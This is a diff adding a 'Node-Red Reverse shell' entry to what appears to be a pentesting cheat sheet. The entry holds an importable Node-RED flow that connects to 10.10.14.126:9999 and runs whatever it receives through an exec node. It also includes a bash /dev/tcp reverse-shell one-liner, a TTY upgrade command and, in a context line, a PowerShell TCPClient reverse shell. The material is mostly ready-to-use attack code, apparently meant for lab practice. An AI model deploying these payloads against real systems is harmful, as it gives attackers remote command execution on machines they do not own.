@@ -413,6 +413,32 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.
 
 <details>
 
+<summary><mark style="color:orange;"><strong><code>Node-Red</code></strong></mark> <mark style="color:red;"><strong><code>Reverse shell</code></strong></mark></summary>
+
+{% code title="Import it" overflow="wrap" %}
+```json
+[{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"},{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"10.10.14.126","port":"9999","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}]
+```
+{% endcode %}
+
+* <mark style="color:purple;">Once you received the connection use another listener you get a more stable shell:</mark>
+
+```sh
+bash -c "bash -i > /dev/tcp/10.10.14.172/3000 0>&1" &
+```
+
+* <mark style="color:purple;">Then use</mark> <mark style="color:orange;">**`script`**</mark><mark style="color:purple;">:</mark>
+
+{% code overflow="wrap" %}
+```sh
+script -qc /bin/bash /dev/null
+```
+{% endcode %}
+
+</details>
+
+<details>
+
 <summary><mark style="color:red;"><strong><code>Bind Shells</code></strong></mark></summary>
 
 {% hint style="info" %}
